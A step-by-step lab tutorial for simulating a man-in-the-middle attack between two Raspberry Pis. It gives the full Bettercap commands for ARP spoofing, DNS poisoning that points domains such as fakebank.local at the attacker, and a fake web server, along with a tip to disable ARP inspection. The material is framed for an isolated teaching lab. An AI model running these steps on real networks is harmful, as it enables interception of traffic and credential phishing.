# Problem

Simulate a Man-in-the-Middle (MITM) attack using ARP spoofing and DNS poisoning in an isolated lab environment. This demonstrates how attackers can intercept traffic and redirect DNS queries to malicious servers.

# Process

### Lab Setup

**Hardware:**

- 2x Raspberry Pis (Pi 4 or 5) — one Attacker, one Victim
- 1 Router/AP (both Pis on same subnet)

**Software:**

- Attacker Pi: Bettercap installed (see installation below)
- Victim Pi: Standard Raspberry Pi OS with browser or curl

---

### Prerequisites — Install Packages on Attacker Pi

**Step 1.** Update package lists:

```bash
sudo apt update
```

**Step 2.** Install Bettercap and dependencies:

```bash
sudo apt install -y bettercap libpcap-dev libnetfilter-queue-dev
```

**Step 3.** (Optional) Install Python for fake web server:

```bash
sudo apt install -y python3
```

---

### Attacker Configuration

**Step 4.** Enable IP forwarding so the attacker can route victim traffic without dropping packets:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

**Step 5.** Launch Bettercap on your network interface:

```bash
sudo bettercap -iface wlan0
```

Replace `wlan0` with your actual interface — use `eth0` for Ethernet.

---

### Step A: ARP Spoofing

#### Option 1: Local/Internal Spoof (Computer A ↔ Computer B)

Use this when you want to intercept traffic between two computers on the same LAN (not internet traffic).

**Step 6a.** Inside Bettercap, probe the network to discover devices:

```jsx
net.probe on

```

**Step 7a.** Note the IPs of Computer A and Computer B from the output.

**Step 8a.** Configure ARP spoofing for internal/local traffic:

```
set arp.spoof.targets <COMPUTER_A_IP>,<COMPUTER_B_IP>
set arp.spoof.internal true
set arp.spoof.fullduplex true
arp.spoof on
```

<aside>
💡

**arp.spoof.internal true** enables spoofing of local LAN traffic between hosts. Without this, Bettercap only spoofs traffic going through the gateway.

**Result:** Computer A thinks the attacker is Computer B, and Computer B thinks the attacker is Computer A. All traffic between them passes through you.

</aside>

#### Option 2: Gateway Spoof (Victim ↔ Router/Internet)

**Step 6.** Inside Bettercap, probe the network to discover devices:

```jsx
net.probe on

```

**Step 7.** Note the Victim's IP and Router's IP from the output.

**Step 8.** Set the ARP spoof target and enable **full-duplex mode**:

```
set arp.spoof.targets <VICTIM_IP>
set arp.spoof.fullduplex true
arp.spoof on
```

<aside>
💡

**Full-duplex mode** spoofs BOTH directions:

- Tells the **Victim** that the attacker is the router
- Tells the **Router** that the attacker is the victim

This ensures you intercept traffic going TO and FROM the victim.

</aside>

---

### Step B: DNS Poisoning

**Step 9.** With ARP spoof active, configure DNS spoofing to redirect specific domains to the attacker. In the Bettercap prompt:

```
set dns.spoof.ttl 60
set [dns.spoof.domains](http://dns.spoof.domains) testsite.local,fakebank.local
set dns.spoof.address <ATTACKER_IP>
dns.spoof on
```

Replace `<ATTACKER_IP>` with the attacker Pi's IP address.

<aside>
⚠️

**dns.spoof.ttl 60** sets the TTL to 60 seconds. The default (1024 seconds) causes spoofed DNS entries to persist on the victim long after you stop the attack. A low TTL ensures the victim's cache expires quickly during cleanup.

</aside>

**Step 10.** (Optional) Start a fake web server on the attacker to serve a landing page:

```bash
python3 -m http.server 80
```

---

### Verification on Victim Pi

**Step 11.** On the Victim Pi, verify the ARP table shows the router's IP mapped to the **attacker's MAC address**:

```bash
arp -a
```

**Step 12.** Test DNS resolution — it should return the attacker's IP:

```bash
nslookup testsite.local
```

**Step 13.** Open a browser and navigate to [`](http://testsite.local)http://testsite.local` — you should see the attacker's fake page.

---

### Cleanup — Restore Attacker Pi to Normal

**Step 14.** Stop Bettercap modules (inside Bettercap prompt):

```
dns.spoof off
arp.spoof off
exit
```

**Step 15.** Disable IP forwarding:

```bash
sudo sysctl -w net.ipv4.ip_forward=0
```

**Step 16.** (Optional) Remove installed packages to fully restore the system:

```bash
sudo apt remove --purge -y bettercap libpcap-dev libnetfilter-queue-dev
sudo apt autoremove -y
sudo apt clean
```

**Step 17.** Verify IP forwarding is disabled (should return `0`):

```bash
cat /proc/sys/net/ipv4/ip_forward
```

---

# Troubleshooting

### ARP spoof not working

- **Router has Dynamic ARP Inspection (DAI):** Some routers have anti-spoofing features. Disable DAI in router settings for the lab, or use a dumb switch.
- **Static ARP entries:** If the victim has static ARP entries, the spoof won't override them.

### DNS spoof not taking effect

- **DNS cache on victim:** The victim may have cached the real DNS entry. Flush the cache:
    - Linux: `sudo systemd-resolve --flush-caches`
    - Or wait for TTL to expire.
- **ARP spoof not active:** DNS spoof requires ARP spoof to be running first — queries must route through you.

### HTTPS sites show certificate errors

- **Expected behavior.** HTTPS + HSTS prevents spoofing of major sites. Your fake server doesn't have a valid certificate. This attack is only effective against HTTP traffic or users who click through warnings.

### Syntax issues with [dns.spoof.domains](http://dns.spoof.domains)

- Use no spaces after commas: `site1.local,site2.local` not `site1.local, site2.local`

---

# Extra Notes

**Official Bettercap Documentation:**

- ARP Spoof module: https://www.bettercap.org/modules/ethernet/spoofers/arpspoof/
- DNS Spoof module: https://www.bettercap.org/modules/ethernet/spoofers/dnsspoof/

**Ethical Warning:** This simulation must only be performed on hardware you own and a private, isolated network. Intercepting traffic on public or unauthorized networks is illegal.

**Alternative:** For a software-only simulation without physical hardware, use GNS3 to virtualize the entire network.
